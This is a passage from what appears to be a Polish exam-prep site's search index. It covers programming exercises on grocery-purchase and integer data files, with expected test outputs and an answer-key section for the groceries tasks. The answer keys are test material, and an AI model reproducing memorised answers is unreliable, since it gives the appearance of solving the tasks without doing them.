si\u0119 wy\u0142\u0105cznie z ma\u0142ych liter alfabetu angielskiego,</li> <li>liczba sztuk - liczba naturalna z przedzia\u0142u \\([1, 100]\\),</li> <li>cena za sztuk\u0119 - liczba rzeczywista z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku, z przedzia\u0142u \\([0.01, 10.01)\\).</li> </ul> <p> groceries.txt</p> <p>W pliku groceries_test.txt znajduje si\u0119 100 linii w formacie podanym powy\u017cej.</p> <p> groceries_test.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj sumaryczny koszt zakup\u00f3w, tzn. sum\u0119 wszystkich cen przemno\u017conych przez liczb\u0119 sztuk dla ka\u017cdej linii w pliku. Wynik podaj z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku.</p> <p>Wynik dla pliku groceries_test.txt: \\(31511.71\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj sumaryczny koszt zakup\u00f3w zak\u0142adaj\u0105c, \u017ce wszystkie produkty, kt\u00f3rych d\u0142ugo\u015b\u0107 nazwy jest liczb\u0105 pierwsz\u0105, maj\u0105 cen\u0119 pomniejszon\u0105 o 50%. Wynik podaj z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku.</p> <p>Wynik dla pliku groceries_test.txt: \\(24897.94\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj \u015bredni\u0105 cen\u0119 zakup\u00f3w, tzn. sumaryczny koszt zakup\u00f3w podzielony przez \u0142\u0105czn\u0105 liczb\u0119 produkt\u00f3w. Wynik podaj z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku.</p> <p>Wynik dla pliku groceries_test.txt: \\(5.78\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-4","title":"Zadanie 4","text":"<p>Dla ka\u017cdego produktu podaj zakupion\u0105 \u0142\u0105czn\u0105 liczb\u0119 sztuk. Wynik uporz\u0105dkuj alfabetycznie po nazwie produktu.</p> <p>Wynik dla pliku groceries_test.txt:</p> <pre><code>apples: 97\navocado: 116\nbananas: 78\nbread: 159\nbutter: 350\ncarrots: 148\ncheese: 118\nchicken: 112\ncucumber: 165\ndates: 181\neggs: 49\nflour: 263\ngarlic: 140\nhoney: 32\niceberg: 363\njam: 141\nkale: 236\nlemons: 160\nmilk: 309\nnuts: 165\nolives: 181\nonions: 35\noranges: 255\npasta: 27\npeppers: 123\npotatoes: 87\nquinoa: 321\nsalmon: 161\nspinach: 292\ntomatoes: 184\nyams: 85\nyogurt: 142\nzucchini: 176\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-5","title":"Zadanie 5","text":"<p>Dla ka\u017cdego produktu podaj jego \u015bredni\u0105 cen\u0119 za sztuk\u0119 z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku. Pami\u0119taj o uwzgl\u0119dnieniu liczby zakupionych produkt\u00f3w. Wynik uporz\u0105dkuj alfabetycznie po nazwie produktu.</p> <p>Wynik dla pliku groceries_test.txt:</p> <pre><code>apples: 2.25\navocado: 4.18\nbananas: 6.67\nbread: 2.97\nbutter: 5.19\ncarrots: 4.19\ncheese: 7.31\nchicken: 8.09\ncucumber: 5.28\ndates: 3.16\neggs: 7.27\nflour: 7.54\ngarlic: 7.90\nhoney: 2.85\niceberg: 3.67\njam: 6.42\nkale: 3.08\nlemons: 5.80\nmilk: 7.46\nnuts: 7.66\nolives: 3.95\nonions: 8.53\noranges: 7.72\npasta: 8.42\npeppers: 8.82\npotatoes: 8.08\nquinoa: 3.69\nsalmon: 6.47\nspinach: 7.05\ntomatoes: 8.24\nyams: 4.94\nyogurt: 6.89\nzucchini: 5.56\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-6","title":"Zadanie 6","text":"<p>Podaj produkt oraz jego najmniejsz\u0105 i najwi\u0119ksz\u0105 cen\u0119 za sztuk\u0119, kt\u00f3rego r\u00f3\u017cnica pomi\u0119dzy najmniejsz\u0105 i najwi\u0119ksz\u0105 cen\u0105 za sztuk\u0119 jest najwi\u0119ksza. Jest tylko jeden taki produkt. Wynik uporz\u0105dkuj alfabetycznie po nazwie produktu.</p> <p>Wynik dla pliku groceries_test.txt:</p> <pre><code>butter: min: 0.45, max: 9.31\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-7","title":"Zadanie 7","text":"<p>Dla ka\u017cdego produktu wypisz wszystkie jego ceny za sztuk\u0119, uporz\u0105dkowane rosn\u0105co. Wynik uporz\u0105dkuj alfabetycznie po nazwie produktu.</p> <pre><code>apples: 2.25\navocado: 3.38, 5.7\nbananas: 6.34, 8.95\nbread: 1.41, 2.76, 3.46, 3.82\nbutter: 0.45, 2.55, 4.66, 7.81, 9.31\ncarrots: 4.1, 4.29\ncheese: 6.07, 8.04\nchicken: 7.61, 8.22\ncucumber: 3.71, 4.66, 8.59\ndates: 0.02, 0.57, 6.71\neggs: 5.82, 9.56\nflour: 4.93, 5.05, 7.2, 7.49, 9.77\ngarlic: 3.83, 4.11, 9.99\nhoney: 2.85\niceberg: 2.32, 3.18, 3.62, 5.12, 5.25\njam: 5.01, 7.12, 8.02\nkale: 0.73, 1.51, 2.72, 4.24, 5.58\nlemons: 5.36, 6.07, 7.81, 8.26\nmilk: 4.47, 5.04, 8.13, 8.55, 8.82, 9.72\nnuts: 2.53, 5.69, 8.67, 9.76\nolives: 1.38, 2.65, 7.79\nonions: 8.17, 9.99\noranges: 6.51, 7.47, 8.93\npasta: 8.42\npeppers: 8.68, 9.01\npotatoes: 8.08\nquinoa: 0.92, 1.73, 2.19, 4.76, 6.3\nsalmon: 3.73, 6.15, 7.12\nspinach: 5.32, 6.16, 6.5, 9.3\ntomatoes: 5.46, 8.46, 8.76, 9.48\nyams: 3.79, 4.39, 5.74\nyogurt: 4.98, 6.46, 8.52\nzucchini: 3.06, 8.42\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/#zadanie-8","title":"Zadanie 8","text":"<p>Podaj sumaryczny koszt zakup\u00f3w zak\u0142adaj\u0105c, \u017ce ka\u017cdego produktu zakupiono \u0142\u0105cznie co najwy\u017cej 100 sztuk. Oznacza to, \u017ce je\u017celi kolejny wpis w pliku zawiera transakcj\u0119, kt\u00f3ra przekroczy limit 100 sztuk dla danego produktu, to uwzgl\u0119dniamy z niej tylko t\u0119 cz\u0119\u015b\u0107 zakupu, kt\u00f3ra nie przekracza limitu, a kolejne transakcje dla tego produktu b\u0119dziemy ignorowa\u0107. Wynik podaj z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku.</p> <p>Wynik dla pliku groceries_test.txt: \\(17484.78\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-1","title":"Zadanie 1","text":"<p>\\(255583.26\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-2","title":"Zadanie 2","text":"<p>\\(197787.08\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-3","title":"Zadanie 3","text":"<p>\\(5.05\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>apples: 1947\navocado: 1308\nbananas: 1601\nbread: 1257\nbutter: 752\ncarrots: 2303\ncheese: 1166\nchicken: 1706\ncucumber: 1065\ndates: 1444\neggs: 1445\nflour: 1293\ngarlic: 1468\ngrapes: 1394\nhoney: 1198\niceberg: 1504\njam: 1258\nkale: 1696\nlemons: 1319\nmilk: 1103\nnuts: 1742\nolives: 1423\nonions: 1293\noranges: 1715\npasta: 1298\npeppers: 1313\npotatoes: 1716\nquinoa: 1457\nrice: 956\nsalmon: 2062\nspinach: 1494\ntomatoes: 1644\nyams: 1495\nyogurt: 1698\nzucchini: 1110\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-5","title":"Zadanie 5","text":"<pre><code>apples: 4.64\navocado: 6.38\nbananas: 6.08\nbread: 5.46\nbutter: 4.29\ncarrots: 5.03\ncheese: 3.89\nchicken: 5.50\ncucumber: 4.58\ndates: 5.96\neggs: 4.73\nflour: 5.23\ngarlic: 3.80\ngrapes: 4.62\nhoney: 5.60\niceberg: 5.78\njam: 5.48\nkale: 4.42\nlemons: 4.39\nmilk: 4.43\nnuts: 5.08\nolives: 4.93\nonions: 5.58\noranges: 5.39\npasta: 5.94\npeppers: 5.45\npotatoes: 4.06\nquinoa: 5.01\nrice: 4.67\nsalmon: 4.87\nspinach: 5.28\ntomatoes: 4.78\nyams: 5.18\nyogurt: 5.13\nzucchini: 4.60\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-6","title":"Zadanie 6","text":"<pre><code>pasta: min: 0.03, max: 9.89\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-7","title":"Zadanie 7","text":"<pre><code>apples: 0.33, 0.81, 0.82, 1.01, 1.05, 1.3, 1.32, 2.11, 2.39, 2.72, 3.33, 3.45, 3.62, 3.65, 3.68, 3.82, 3.92, 4.12, 4.25, 4.26, 4.38, 4.92, 4.96, 5.62, 5.96, 6.03, 6.72, 6.98, 7.2, 7.24, 7.28, 7.33, 7.5, 7.8, 7.97, 8.62, 8.67, 8.96, 9.41, 9.43\navocado: 0.79, 1.96, 2.66, 3.01, 3.53, 3.79, 3.96, 4.12, 4.32, 4.57, 5.01, 5.66, 5.71, 5.79, 6.88, 7.84, 8.13, 8.25, 8.28, 8.28, 8.9, 9.18, 9.36, 9.39, 9.74, 9.9\nbananas: 1.83, 2.43, 2.91, 2.93, 3.02, 3.42, 3.46, 3.53, 3.72, 4.54, 5.12, 5.23, 5.48, 5.71, 6.86, 6.88, 7.3, 7.44, 7.58, 7.74, 7.77, 7.83, 8.32, 8.51, 8.86, 8.89, 9.05, 9.24, 9.73\nbread: 0.09, 0.77, 0.87, 0.96, 1.15, 1.44, 1.92, 1.94, 2.12, 3.2, 3.32, 3.69, 4.27, 4.33, 4.98, 5.61, 6.62, 7.82, 7.97, 8.14, 8.34, 8.61, 8.67, 9.08, 9.48\nbutter: 0.2, 0.27, 1.02, 1.37, 1.72, 2.55, 2.91, 3.45, 3.47, 3.77, 4.3, 6.03, 7.81, 7.84, 8.0\ncarrots: 0.76, 1.07, 1.2, 1.36, 1.47, 1.8, 1.88, 2.04, 2.11, 2.24, 2.32, 3.01, 3.16, 3.43, 3.46, 3.76, 3.89, 3.96, 4.07, 4.22, 4.25, 4.79, 5.03, 5.31, 5.36, 5.55, 5.84, 6.0, 6.08, 6.15, 6.2, 6.72, 6.87, 7.32, 7.49, 7.59, 7.62, 7.95, 8.32, 8.37, 8.5, 9.1, 9.1, 9.21, 9.93, 9.99\ncheese: 0.41, 0.52, 0.52, 0.68, 0.78, 1.03, 1.22, 1.49, 1.56, 1.73, 1.94, 2.31, 2.31, 2.58, 2.94, 3.93, 4.42, 5.83, 5.89, 6.41, 6.9, 7.36, 7.39, 8.03, 8.48, 9.14, 9.6\nchicken: 0.13, 0.71, 1.2, 1.27, 1.38, 1.77, 2.04, 2.18, 3.92, 4.13, 4.24, 4.33, 4.48, 5.04, 5.07, 5.64, 6.28, 6.56, 6.93, 7.38, 7.5, 7.94, 8.17, 8.43, 8.44, 8.55, 8.85, 9.55\ncucumber: 0.11, 0.8, 1.01, 1.4, 1.64, 1.75, 2.14, 3.58, 3.86, 4.13, 4.13, 4.42, 4.86, 6.13, 6.4, 6.55, 6.91, 7.21, 7.58, 8.59, 9.15, 9.45\ndates: 0.37, 0.91, 0.97, 1.1, 2.44, 2.53, 2.9, 3.1, 4.28, 4.61, 5.35, 5.75, 5.8, 6.22, 6.35, 6.37, 6.53, 6.81, 6.93, 7.04, 7.13, 7.57, 7.9, 8.0, 8.05, 8.07, 8.61, 9.12\neggs: 0.09, 0.11, 0.56, 0.87, 0.91, 1.28, 2.73, 2.74, 3.07, 3.72, 3.84, 3.9, 4.21, 4.52, 4.79, 5.08, 5.16, 5.29, 5.5, 5.62, 6.12, 6.22, 6.7, 6.96, 7.1, 7.42, 7.66, 7.88, 8.62, 9.19, 9.95, 9.95\nflour: 0.05, 0.39, 0.66, 0.96, 1.12, 1.25, 1.65, 1.71, 3.0, 3.18, 3.33, 3.9, 4.54, 4.64, 5.07, 5.78, 6.02, 6.06, 6.12, 6.99, 7.17, 7.65, 7.7, 7.94, 8.11, 8.43, 8.49, 8.53, 8.74, 9.7\ngarlic: 0.04, 0.13, 0.2, 0.44, 0.48, 0.57, 1.91, 2.06, 2.29, 2.71, 2.76, 3.49, 3.5, 3.6, 4.08, 4.88, 5.58, 5.79, 5.91, 6.22, 6.54, 6.79, 7.22, 7.36, 7.7, 7.91, 8.52, 8.86, 9.15, 9.37\ngrapes: 0.03, 0.73, 0.75, 0.84, 1.14, 2.21, 2.41, 2.73, 2.81, 3.08, 3.23, 3.4, 4.24, 4.38, 4.63, 5.09, 5.18, 5.5, 5.65, 5.84, 6.57, 6.84, 7.37, 7.37, 7.58, 7.99, 8.16, 8.23, 8.53, 9.08\nhoney: 0.14, 0.19, 1.06, 1.08, 1.4, 1.73, 1.96, 1.96, 3.36, 3.48, 3.93, 4.14, 4.31, 4.51, 4.57, 4.81, 4.95, 5.2, 5.36, 5.74, 6.33, 6.42, 6.43, 6.47, 7.4, 8.23, 8.85, 9.48, 9.55, 9.75\niceberg: 0.27, 0.55, 0.63, 0.75, 1.22, 2.74, 3.78, 4.56, 5.21, 5.31, 5.65, 6.07, 6.39, 6.55, 6.71, 6.71, 6.73, 7.41, 7.78, 8.29, 8.34, 8.69, 9.14, 9.51, 9.61, 9.71, 9.75\njam: 0.57, 0.77, 1.19, 2.98, 3.02, 3.19, 3.26, 3.55, 3.61, 4.46, 4.53, 4.86, 5.7, 6.08, 6.58, 7.04, 7.37, 7.47, 8.43, 8.45, 8.5, 8.79, 8.81, 9.81\nkale: 1.15, 1.33, 1.47, 1.52, 1.52, 1.58, 1.83, 2.1, 2.39, 2.44, 2.99, 3.21, 3.29, 3.29, 3.52, 3.8, 5.12, 5.31, 5.39, 5.88, 5.89, 5.94, 6.12, 6.49, 6.56, 6.71, 7.16, 7.51, 8.29, 8.34, 9.39, 9.53\nlemons: 0.05, 0.16, 0.4, 1.25, 1.63, 1.72, 1.99, 2.05, 2.19, 3.18, 3.21, 3.28, 4.09, 4.42, 5.3, 5.36, 5.79, 5.8, 6.69, 6.72, 6.85, 7.28, 8.81, 8.91, 9.55, 9.78, 9.78\nmilk: 0.03, 0.16, 0.52, 0.84, 1.09, 1.14, 1.68, 1.78, 2.99, 3.63, 4.54, 6.05, 6.44, 6.47, 6.69, 8.08, 8.25, 8.86, 8.94, 9.83\nnuts: 0.1, 0.2, 0.76, 0.81, 2.34, 2.6, 2.91, 2.96, 3.69, 3.94, 4.6, 4.61, 4.63, 4.95, 5.12, 5.69, 5.71, 6.39, 6.74, 7.2, 8.26, 8.31, 8.45, 8.59, 8.87, 9.01, 9.35, 9.55\nolives: 0.11, 0.5, 1.03, 1.26, 1.73, 1.87, 1.91, 2.02, 2.57, 3.17, 3.58, 4.03, 4.05, 4.64, 4.7, 5.31, 5.68, 5.71, 6.36, 6.38, 6.39, 6.85, 7.07, 7.77, 8.58, 8.61, 8.61, 8.79, 9.06, 9.07, 9.13\nonions: 0.84, 1.94, 2.12, 2.3, 2.74, 3.68, 3.99, 4.16, 4.38, 4.56, 5.03, 5.13, 5.9, 6.42, 6.46, 6.65, 8.33, 8.36, 8.37, 8.79, 8.89, 9.19, 9.2, 9.51\noranges: 0.23, 0.73, 0.99, 1.01, 1.41, 2.59, 2.94, 3.04, 3.07, 3.75, 4.16, 4.26, 4.48, 4.73, 5.22, 5.24, 6.03, 6.17, 6.38, 7.17, 7.52, 8.03, 8.22, 8.25, 8.63, 8.64, 8.66, 9.27, 9.65, 9.88, 9.91\npasta: 0.03, 0.86, 1.4, 1.86, 2.13, 2.62, 3.4, 3.46, 4.39, 5.37, 5.62, 5.7, 6.06, 6.63, 6.75, 6.84, 7.25, 7.9, 8.61, 8.83, 8.93, 9.14, 9.39, 9.39, 9.89\npeppers: 0.91, 1.07, 1.14, 1.49, 2.08, 3.07, 3.55, 3.62, 4.57, 5.85, 5.9, 6.01, 6.29, 6.37, 6.45, 6.88, 6.91, 6.93, 7.35, 7.7, 7.96, 8.26, 9.48, 9.77, 9.89\npotatoes: 0.08, 0.13, 0.77, 0.78, 1.37, 1.74, 2.25, 2.45, 2.95, 3.14, 3.27, 3.34, 3.42, 3.49, 3.5, 3.75, 3.77, 3.87, 4.53, 4.65, 4.97, 5.01, 5.22, 5.31, 5.48, 5.54, 6.06, 6.66, 6.81, 8.05, 8.25, 9.38, 9.55, 9.77\nquinoa: 0.17, 0.48, 1.04, 1.21, 1.42, 2.95, 3.01, 4.1, 4.2, 5.23, 5.77, 6.16, 6.46, 6.53, 6.83, 6.89, 7.25, 7.43, 7.8, 7.8, 8.15, 8.3, 8.39, 8.61, 8.84, 9.1, 9.12, 9.54\nrice: 0.16, 0.19, 0.28, 1.38, 1.61, 2.54, 3.4, 3.7, 3.8, 3.85, 4.08, 4.54, 4.65, 5.49, 5.5, 5.81, 6.36, 7.18, 7.48, 9.42, 9.62, 9.81\nsalmon: 0.27, 0.66, 0.99, 1.25, 1.43, 1.54, 1.55, 2.0, 2.2, 2.92, 3.41, 3.41, 3.49, 3.81, 3.91, 3.92, 3.94, 4.33, 4.48, 4.57, 4.8, 5.73, 6.1, 6.18, 6.22, 6.73, 6.93, 7.0, 7.64, 7.84, 8.19, 8.2, 8.61, 8.63, 8.67, 8.94, 9.1, 9.13, 9.3, 9.43\nspinach: 0.39, 0.47, 0.53, 1.1, 1.14, 1.37, 2.5, 2.71, 2.86, 2.94, 3.21, 3.3, 3.47, 3.79, 3.92, 4.14, 4.62, 4.91, 4.95, 4.96, 5.44, 6.14, 6.26, 7.11, 7.15, 7.58, 8.18, 8.8, 8.84, 8.88, 9.07, 9.76, 9.94\ntomatoes: 0.32, 1.24, 1.86, 1.86, 2.02, 2.36, 2.45, 2.46, 2.55, 2.69, 2.82, 2.89, 3.26, 3.54, 4.0, 4.62, 4.69, 5.31, 5.96, 6.08, 6.63, 6.74, 6.92, 7.89, 8.85, 8.98, 9.26, 9.33, 9.92\nyams: 0.06, 0.12, 0.38, 1.05, 1.11, 1.21, 1.99, 2.05, 2.44, 2.88, 3.91, 3.98, 4.07, 5.1, 5.13, 5.58, 5.6, 5.65, 5.79, 7.43, 8.37, 8.42, 8.49, 8.91, 9.05, 9.07, 9.41, 9.77, 9.82\nyogurt: 0.51, 0.76, 0.77, 0.97, 1.02, 1.62, 1.73, 2.14, 2.25, 2.75, 2.89, 3.01, 3.15, 3.39, 3.8, 4.17, 4.9, 5.86, 6.26, 6.53, 6.88, 6.92, 7.03, 7.45, 7.61, 7.77, 8.44, 8.55, 8.89, 9.25, 9.6, 9.68\nzucchini: 0.32, 1.31, 1.38, 1.45, 1.85, 2.0, 2.77, 3.14, 3.28, 4.71, 5.18, 5.76, 6.07, 7.0, 7.26, 7.26, 7.31, 7.52, 7.83, 8.94, 9.36\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/answers/#zadanie-8","title":"Zadanie 8","text":"<p>\\(15987.32\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/","title":"Liczby ca\u0142kowite","text":"<p>W pliku integers.txt znajduje si\u0119 \\(100\\) r\u00f3\u017cnych liczb naturalnych z zakresu \\([2,200]\\). Ka\u017cda linia w pliku zawiera jedn\u0105 liczb\u0119.</p> <p> integers.txt</p> <p>W pliku integers_test.txt znajduje si\u0119 \\(10\\) r\u00f3\u017cnych liczb ca\u0142kowitych. Ka\u017cda linia w pliku zawiera jedn\u0105 liczb\u0119.</p> <p> integers_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj najmniejsz\u0105 i najwi\u0119ksz\u0105 warto\u015b\u0107 z pliku, oraz ich pozycj\u0119 (numer wiersza) w pliku.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Minimum: 6 Pozycja: 1\nMaksimum: 29 Pozycja: 10\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj sum\u0119 i \u015bredni\u0105 (z zaokr\u0105gleniem do dw\u00f3ch miejsc po przecinku) wszystkich warto\u015bci z pliku.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Suma: 190\n\u015arednia: 19.00\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj ile jest w pliku warto\u015bci parzystych. </p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>4\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj najmniejsz\u0105 i najwi\u0119ksz\u0105 warto\u015b\u0107 parzyst\u0105 z pliku.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Minimum parzyste: 6\nMaksimum parzyste: 28\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj ile jest liczb z pliku, kt\u00f3re s\u0105 wielokrotno\u015bci\u0105 jednocze\u015bnie liczb 3 i 5.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-6","title":"Zadanie 6","text":"<p>Dla ka\u017cdej pary s\u0105siednich warto\u015bci policz ich najwi\u0119kszy wsp\u00f3lny dzielnik. Podaj najwi\u0119ksz\u0105 i najmniejsz\u0105 warto\u015b\u0107 takiego dzielnika.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Maksimum NWD: 3\nMinimum NWD: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-7","title":"Zadanie 7","text":"<p>Policz najmniejsz\u0105 wsp\u00f3ln\u0105 wielokrotno\u015b\u0107 dla wszystkich liczb w pliku mniejszych od 20.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>NWW: 360\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-8","title":"Zadanie 8","text":"<p>Sprawd\u017a, ile liczb w pliku jest liczbami pierwszymi.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-9","title":"Zadanie 9","text":"<p>Dla ka\u017cdej liczby z pliku wyznacz sum\u0119 jej cyfr. Znajd\u017a liczb\u0119 o najwi\u0119kszej sumie cyfr oraz liczb\u0119 o najmniejszej sumie cyfr. Podaj te liczby oraz ich sum\u0119 cyfr.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Minimalna suma cyfr: 3 Liczba: 21\nMaksymalna suma cyfr: 11 Liczba: 29\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-10","title":"Zadanie 10","text":"<p>Znajd\u017a wszystkie pary liczb w pliku, kt\u00f3re s\u0105 wzgl\u0119dem siebie liczbami wzajemnie pierwszymi (tzn. ich najwi\u0119kszy wsp\u00f3lny dzielnik to 1). Jako wynik podaj pary o najmniejszej i najwi\u0119kszej sumie.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Para o najwi\u0119kszej sumie: (28, 29)\nPara o najmniejszej sumie: (8, 9)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-11","title":"Zadanie 11","text":"<p>Dla ka\u017cdej liczby z pliku sprawd\u017a, czy jest ona doskona\u0142a (tzn. czy jest r\u00f3wna sumie swoich dzielnik\u00f3w w\u0142a\u015bciwych, tj. wszystkich dzielnik\u00f3w opr\u00f3cz siebie samej). Podaj wszystkie liczby doskona\u0142e z pliku.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>6\n28\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-12","title":"Zadanie 12","text":"<p>Podaj median\u0119 warto\u015bci z pliku (warto\u015b\u0107 \u015brodkow\u0105 w uporz\u0105dkowanej rosn\u0105co li\u015bcie wszystkich liczb).</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>22\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-13","title":"Zadanie 13","text":"<p>Znajd\u017a liczb\u0119, kt\u00f3ra pojawia si\u0119 najcz\u0119\u015bciej w pliku i podaj liczb\u0119 jej wyst\u0105pie\u0144. Je\u017celi jest kilka takich liczb, podaj najmniejsz\u0105 z nich.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Najpopularniejsza liczba: 6\nLiczba wyst\u0105pie\u0144: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-14","title":"Zadanie 14","text":"<p>Policz, ile jest liczb w pliku, kt\u00f3re s\u0105 pot\u0119g\u0105 liczby 2.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-15","title":"Zadanie 15","text":"<p>Dla ka\u017cdej liczby z pliku wyznacz jej reprezentacj\u0119 binarn\u0105 (w postaci ci\u0105gu zer i jedynek). Podaj, ile liczb w swojej reprezentacji binarnej ma: </p> <ul> <li>wi\u0119cej zer ni\u017c jedynek,</li> <li>mniej zer ni\u017c jedynek,</li> <li>tyle samo zer co jedynek.</li> </ul> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>Wi\u0119cej zer: 2\nMniej zer: 7\nTyle samo: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-16","title":"Zadanie 16","text":"<p>Podaj wszystkie liczby z pliku, kt\u00f3re s\u0105 iloczynem dw\u00f3ch liczb pierwszych.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>4\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-17","title":"Zadanie 17","text":"<p>Podaj ile liczb z pliku jest silni\u0105 jakiej\u015b liczby naturalnej.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-18","title":"Zadanie 18","text":"<p>Podaj liczby z pliku, kt\u00f3re s\u0105 kwadratem jakiej\u015b liczby naturalnej.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>9\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-19","title":"Zadanie 19","text":"<p>Podaj ile jest r\u00f3\u017cnych tr\u00f3jek liczb z pliku, kt\u00f3re spe\u0142niaj\u0105 warunek tr\u00f3jk\u0105ta, tzn. z bok\u00f3w o takiej d\u0142ugo\u015bci mo\u017cna zbudowa\u0107 tr\u00f3jk\u0105t. </p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>80\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-20","title":"Zadanie 20","text":"<p>Podaj wszystkie liczby z pliku, kt\u00f3rych kwadrat ko\u0144czy si\u0119 tak\u0105 sam\u0105 cyfr\u0105 co sama liczba.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>6\n15\n21\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-21","title":"Zadanie 21","text":"<p>Podaj wszystkie liczby z pliku, kt\u00f3re s\u0105 liczbami Kaprekara. Liczba Kaprekara to taka liczba, kt\u00f3rej kwadrat mo\u017cna podzieli\u0107 na dwie cz\u0119\u015bci (tak by obie by\u0142y r\u00f3\u017cne od zera), kt\u00f3re po zsumowaniu daj\u0105 wynik r\u00f3wny oryginalnej liczbie. Przyk\u0142adowo, \\(55\\) jest liczb\u0105 Kaprekara, poniewa\u017c \\((55)^2 = 3025\\), a \\(30 + 25 = 55\\).</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>9\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-22","title":"Zadanie 22","text":"<p>Podaj wszystkie liczby z pliku, kt\u00f3re s\u0105 liczbami wie\u017cowymi, tzn. w ich zapisie binarnym najpierw wyst\u0119puj\u0119 ci\u0105g sk\u0142adaj\u0105cy si\u0119 z jednej lub wi\u0119cej cyfr \\(1\\), a nast\u0119pnie ci\u0105g sk\u0142adaj\u0105cy si\u0119 z jednej lub wi\u0119cej cyfr \\(0\\). Podaj tak\u017ce zapis binarny tych liczb.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>6 110\n8 1000\n24 11000\n28 11100\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-23","title":"Zadanie 23","text":"<p>Podaj wszystkie liczby z pliku, kt\u00f3re s\u0105 liczbami Fryderyka, tzn. s\u0105 r\u00f3wne sumie kolejnych pot\u0119g swoich cyfr. Przyk\u0142adowo, \\(89\\) jest liczb\u0105 